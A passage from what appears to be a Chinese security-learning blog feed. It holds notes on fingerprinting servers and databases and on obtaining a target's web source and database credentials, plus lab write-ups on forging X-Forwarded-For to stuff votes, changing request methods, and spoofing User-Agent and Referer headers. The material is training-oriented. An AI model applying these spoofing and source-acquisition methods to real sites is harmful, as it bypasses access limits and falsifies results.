TTL：64</p><p>通过Nmap判断操作系统：Nmap在探测操作系统使用-O选项可启用操作系统探测。</p><p><strong>识别操作系统的意义：</strong></p><p>windows和linux在某些漏洞执行方面会不同，测试时候可能会出现问题，因此需要判断是在什么系统上产生的漏洞。</p><h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><p><strong>如何识别数据库类型：</strong></p><p>1.通过网站识别数据库（脚本连接的数据库）：</p><p>ASP+<strong>Access</strong>（只能在windows平台）</p><p>PHP+mysql</p><p>aspx+mssql &#x2F; <strong>sql server</strong>（只能在windows平台）</p><p>jsp+mssql &#x2F; sql server &#x2F; mysql &#x2F; oracle</p><p>python+mysql(少)&#x2F; PostgreSQL &#x2F;oracle &#x2F; MongDB</p><p>……</p><p>2.通过端口扫描判断数据库类型：</p><p>Access端口：无端口</p><p>mysql端口：3306</p><p>mssql端口：1433</p><p>oracle端口：1521</p><p>MongDB端口：27017</p><p>Redis默认端口：6379</p><p>PostgreSQL默认端口：5432</p><p>……</p><p><strong>数据库类型识别意义：</strong> </p><p>数据库不同，结构不同，产生的漏洞不同，不同的数据库攻击方法不同。</p><p><strong>数据库常见攻击：</strong></p><p>弱口令；漏洞</p><p><strong>数据库层面漏洞影响：</strong></p><p>获取到数据库权限；获取到网站权限。</p><h3 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h3><p>常见第三方平台或软件见上图。</p><p>漏洞类型及攻击：弱口令攻击；漏洞攻击等。</p><p>第三方平台或软件安全测试危害：直接影响权限。</p><p>###<strong>补充：</strong><br>除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务(邮件、游戏、负载均衡等)也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的！</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB源码拓展</title>
      <link href="/2022/01/25/WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/"/>
      <url>/2022/01/25/WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><p>##前言</p><p>​      WEB 源码在安全测试中是非常重要的信息来源，可以用来代码审 计漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。 比如：获取某 ASP 源码后可以采用默认数据库下载为突破，获取某其他脚本 源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为 后期的安全测试提供了更多的思路。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>关于 WEB 源码目录结构 ：后台目录，模版目录，数据库目录</p><p>关于 WEB 源码脚本类型 ：ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码安全问题</p><p>关于 WEB 源码应用分类：社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p><p>关于 WEB 源码其他说明：开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续</p><hr><p><strong>框架非框架：</strong>             </p><p>若对方网站采用框架开发的话，找框架漏洞，而不是找其代码漏洞；若是非框架的话，找其代码漏洞；</p><p><strong>CMS识别：</strong></p><p>如果找漏洞找不到，自己分析；若是已经找到的话就在网上找别人分析的漏洞进行攻击；</p><p>CMS的开源或内部：<br>开源–直接找漏洞或审计</p><p>内部–常规渗透测试</p><p>由此，<strong>渗透常规思路</strong>：拿到一个网站的时候：</p><p>1.判断是否是CMS</p><p>2.CMS分开源和内部，开源的话自己挖漏洞或搜漏洞；内部的话，进行黑盒测试一步一步找漏洞</p><p><strong>源码获取：</strong></p><p>1.可以扫描其备份文件，网站为了防止东西遗失，一般都会将网站源码或数据库文件进行相关备份，有时候就能通过扫描工具进行探针到备份文件进行源码下载；</p><p>2.通过CMS识别技术得到对方的名字在网上下载其源码；</p><p>3.特定源码特定渠道，针对违法类的网站，这种网站不会采用网上公开的大众化的源码；这种情况只能按照特定的渠道获取其源码。</p><p><strong>关于源码获取的相关途径：</strong>搜索，闲鱼淘宝，第三方源码站，各种行业对应</p><p><strong>数据库配置文件 ：</strong></p><p>若可以得到数据库配置文件，可知其网站连接数据库的账号密码，则可从数据库中得其管理员的账号密码，直接登录其后台，得到相应的数据。</p><p><img src="/2022/01/25/WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/202106241707055.png"></p><p>图片来源：<a href="https://blog.csdn.net/m0_55227191/article/details/116804100">https://blog.csdn.net/m0_55227191/article/details/116804100</a></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想 办法获取！</p><h2 id="ASP源码下的一些特点"><a href="#ASP源码下的一些特点" class="headerlink" title="ASP源码下的一些特点"></a>ASP源码下的一些特点</h2><p>ASP网站中特有的文件：xycms.mdb（mdb后缀，数据库文件）。</p><p>​      ·根据其网站特性可以下载其数据库文件，再找到后台文件，然后访问后台。</p><h2 id="简要目标从识别到源码获取"><a href="#简要目标从识别到源码获取" class="headerlink" title="简要目标从识别到源码获取"></a>简要目标从识别到源码获取</h2><p>1.人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试 </p><p>2.借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他</p><h2 id="涉及学习网站"><a href="#涉及学习网站" class="headerlink" title="涉及学习网站"></a>涉及学习网站</h2><p>Web安全学习笔记：<a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p><p>CMS识别网站：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p><p>​                           <a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><p>CMS指纹库：<a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a></p><p>雨苁Blog：<a href="https://www.ddosi.org/">https://www.ddosi.org/</a></p><p>Github监控器：<a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建安全拓展</title>
      <link href="/2022/01/24/%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/"/>
      <url>/2022/01/24/%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>常见搭建平台脚本启用</p><p>域名 IP 目录解析安全问题 </p><p>常见文件后缀解析对应安全 </p><p>常见安全测试中的安全防护 </p><p>WEB 后门与用户及文件权限</p><hr><p>1.ASP,PHP,ASPX,JSP,PY,JAVAWEB 等环境 </p><p>2.WEB 源码中敏感文件 后台路径，数据库配置文件，备份文件等 </p><p>3.IP 或域名解析 WEB 源码目录对应下的存在的安全问题 域名访问，IP 访问（结合类似备份文件目录）</p><p>4.脚本后缀对应解析（其他格式可相同-上传安全）</p><p>5.存在下载或为解析问题 </p><p>6.常见防护中的 IP 验证，域名验证等 </p><p>7.后门是否给予执行权限 </p><p>8.后门是否给予操作目录或文件权限 </p><p>9.后门是否给予其他用户权限</p><hr><h3 id="IP访问网站和域名访问网站的区别"><a href="#IP访问网站和域名访问网站的区别" class="headerlink" title="IP访问网站和域名访问网站的区别"></a>IP访问网站和域名访问网站的区别</h3><p>搭建好的一个网站，如果使用IP去访问，会访问到其根目录，使用域名访问，指向其根目录下的一个文件。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者学院-投票系统程序设计缺陷分析</title>
      <link href="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/"/>
      <url>/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>启动靶场进入靶场的投票页面：</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124134028395.png" alt="image-20220124134028395"></p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124134148994.png" alt="image-20220124134148994"></p><p>页面提示每个IP每天只限投一次票</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>先抓个包看看：<br><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124134339926.png" alt="image-20220124134339926"></p><p>为ggg投完票后显示id&#x3D;7，且返回结果0；</p><p>再给ggg投票抓包看结果：</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124134523763.png" alt="image-20220124134523763"></p><p>结果返回-1，并提示投票机会用完<br><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124134554092.png" alt="image-20220124134554092"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>根据提示信息：</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124134757069.png" alt="image-20220124134757069"></p><p>应该是<strong>利用X-Forwarded-For伪造IP</strong>进行投票</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>重新抓包随便构造IP</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124142954500.png" alt="image-20220124142954500"></p><p><strong>标注一下</strong>：</p><p>这步我自己其实耗费了很长时间，知道怎么去爆破，但遗漏了一个知识点，导致花费了很长时间才完成，如下：</p><p>Request请求数据包格式：</p><p>1.请求行：请求类型&#x2F;请求资源路径、协议的版本和类型</p><p>2.请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义</p><p>3**.空行**：请求头与请求体之间用一个空行隔开</p><p>4.请求体：要发送的数据(一般 post 提交会使用)；例：user&#x3D;123&amp;pass&#x3D;123</p><p>由下图可知请求数据包的最后一个字段是请求体并且是POST方式，请求体上一行有一行空格，导致我爆破的时候，将XFF放在了<strong>空行</strong>的位置上，导致爆破的时候一直返回无效的HTTP请求。最后才发现数据包的格式错误。<strong>请求体上一行的一定是空行，什么都不能填</strong></p><p>之后在BP中的Intruder中选择爆破类型，选择爆破参数，这里的爆破参数为网段位和主机位</p><p>（只要票数得了第一就好，爆破参数随便几位）</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124143029228.png" alt="image-20220124143029228"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>之后BP中 的Payloads中修改Payload set和Payload type，类型一定是Numbers，然后这里我设置的是从1到200，每次增加1票</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124144505974.png" alt="image-20220124144505974"></p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124144438838.png" alt="image-20220124144438838"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>如图爆破的每个数据回应包都返回是0，而上面抓包可知重复IP投票返回的结果是-1，则证明投票成功。</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124144743018.png" alt="image-20220124144743018"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>最后返回投票页面刷新页面得到KEY</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124143255045.png" alt="image-20220124143255045"></p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/image-20220124145042114.png" alt="image-20220124145042114"></p><p>完成靶场。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者学院-HTTP动作练习</title>
      <link href="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/"/>
      <url>/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先启动靶场</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/image-20220124125408694.png" alt="image-20220124125408694"></p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/image-20220124125427719.png" alt="image-20220124125427719"></p><p>返回结果是由于请求的URL太长，给的提示也是url这么长，GET合适么？说明请求的方式是GET</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>先抓个包验证一下是不是GET方式</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/image-20220124125713127.png" alt="image-20220124125713127"></p><p>由包来看确实是GET方式，并且内容很多</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>由于HTTP中GET请求方式和POST请求方式两者有区别，并且提示使用POST方式提交</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/image-20220124125917492.png" alt="image-20220124125917492"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>那就改成POST请求方式提交内容，在BP里改成POST方式，如图：</p><p>右键点击Change request method</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/image-20220124130055977.png" alt="image-20220124130055977"></p><p>改完之后的包：</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/image-20220124130113880.png" alt="image-20220124130113880"></p><p>这里最重要的就是GET请求有长度限制，而POST请求没有长度限制。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>提交之后得到KEY</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/image-20220124130304850.png" alt="image-20220124130304850"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-HTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/image-20220124130515150.png" alt="image-20220124130515150"></p><p>完成靶场。</p><p>##0x06</p><p>GET和POST两种请求方式的区别：</p><p><strong>GET：</strong></p><p>使用 GET 方法时，查询字符串（名称或键值对）是在 GET 请求的 URL 中发送的：</p><ul><li>GET 请求可被缓存</li><li>GET 请求保留在浏览器历史记录中</li><li>GET 请求的URL可被收藏为书签</li><li>GET 请求不应在处理敏感数据时使用</li><li>GET 请求有长度限制</li><li>GET 请求只应当用于获取数据</li></ul><p>GET 方法是默认的从浏览器向 Web 服务器传递信息的请求方法，它会产生一个很长的字符串，出现在浏览器的地址栏中。<strong>GET 方法有大小限制：请求字符串中最多只能有 1024 个字符</strong>。</p><p><strong>POST：</strong></p><p>使用POST方法时，查询字符串（名称或键值对）是在POST请求的HTTP消息主体重发送的：使用 doGet()方法处理这种类型的请求。</p><ul><li>POST 请求不会被缓存</li><li>POST 请求不会保留在浏览器历史记录中</li><li>POST请求的URL不能被收藏为书签</li><li><strong>POST 请求没有长度要求</strong></li></ul><p>HTTP的方法中POST向后台传输数据比较可靠，POST 方法打包信息的方式与 GET 方法基本相同，但是 POST 方法不是把信息作为 URL 中 ?  字符后的文本字符串进行发送，而是把这些信息作为一个单独的消息进行发送。Servlet 使用 doPost() 方法处理这种类型的请求。</p><ul><li><p>在浏览器进行回退操作时，GET 请求是无害的，而 POST 请求则会重新请求一次</p></li><li><p>GET 请求参数是连接在 URL 后面的,而POST请求参数是存放在消息主体（Requestbody）内</p></li><li><p>GET 请求因为浏览器对 url 长度有限制（不同浏览器长度限制不一样）对传参数量有限制，而 post 请求因为参数存放 Requestbody 内所以参数数量没有限制 </p></li><li><p>因为 GET 请求参数暴露在URL上,所以安全方面 POST 比 GET 更加安全</p></li><li><p>GET 请求浏览器会主动缓存（Cache），POST 并不会，除非主动设置</p></li><li><p>GET 请求参数会保存在浏览器历史记录内，POST 请求并不会</p></li><li><p>GET 请求只能进行 URL 编码，而 POST 请求可以支持多种编码方式</p></li><li><p>GET 请求产生1个 Tcp 数据包，POST 请求产生2个 Tcp 数据包</p></li><li><p>浏览器在发送 GET 请求时会将请求头（Header）和数据（Data）一起发送给服务器，服务器返回200状态码，而在发送 POST 请求时，会先将 Header 发送给服务器，服务器返回100，之后再将 Data 发送给服务器，服务器返回200</p><p>（文本来源于w3cschool）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者学院-浏览器信息伪造</title>
      <link href="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/"/>
      <url>/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>启动靶场后显示</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/image-20220124111930551.png" alt="image-20220124111930551"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>点击”这是微信最好的状态：……”后</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/image-20220124112135703.png" alt="image-20220124112135703"></p><p>提示使用苹果手机的2G网络进行访问</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>不管什么东西，先抓个包看看</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/image-20220124112354275.png" alt="image-20220124112354275"></p><p>正是刚才提示的页面数据包</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>由于提示使用苹果手机访问，先利用BurpSuit修改iPone访问的包，由于还得是2G网络，</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/image-20220124112742704.png" alt="image-20220124112742704"></p><p>再接着分析解题方向还得有NetType，去网上找找这个字段</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/image-20220124112952217.png" alt="image-20220124112952217"></p><p>在网上找到了浏览器类型并且附带NetType&#x2F;2G的字段，直接复制粘贴可好</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>修改包的内容：</p><p>将包里的User-Agent字段修改为以下内容：</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/image-20220124113517911.png" alt="image-20220124113517911"></p><p>得到KEY。</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>至此，浏览器信息伪造完成</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/image-20220124113647750.png" alt="image-20220124113647750"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者学院-来源页伪造</title>
      <link href="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%9D%A5%E6%BA%90%E9%A1%B5%E4%BC%AA%E9%80%A0/"/>
      <url>/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%9D%A5%E6%BA%90%E9%A1%B5%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先启动靶场</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%9D%A5%E6%BA%90%E9%A1%B5%E4%BC%AA%E9%80%A0/image-20220124105055186.png" alt="image-20220124105055186"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>进入靶场后表示只能使用google浏览器访问</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%9D%A5%E6%BA%90%E9%A1%B5%E4%BC%AA%E9%80%A0/image-20220124105227291.png" alt="image-20220124105227291"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>首先想到不可能每次都使用Google访问，解题提示使用referer构造google访问的请求数据包</p><p>利用Burpsuite进项伪造</p><p>二话不说先抓个包</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%9D%A5%E6%BA%90%E9%A1%B5%E4%BC%AA%E9%80%A0/image-20220124105708463.png" alt="image-20220124105708463"></p><p>接下来伪造Google访问数据包</p><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%9D%A5%E6%BA%90%E9%A1%B5%E4%BC%AA%E9%80%A0/image-20220124110139173.png" alt="image-20220124110139173"></p><p>将Referer: <a href="http://219.153.49.228:42036/index.html%E6%9B%BF%E6%8D%A2%E6%88%90Referer">http://219.153.49.228:42036/index.html替换成Referer</a>: <a href="http://google.com/">http://google.com</a></p><p>得到KEY。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><img src="/2022/01/24/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%9D%A5%E6%BA%90%E9%A1%B5%E4%BC%AA%E9%80%A0/image-20220124110501092.png" alt="image-20220124110501092"></p><p>完成来源页伪造。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据包拓展</title>
      <link href="/2022/01/23/%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/"/>
      <url>/2022/01/23/%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/</url>
      
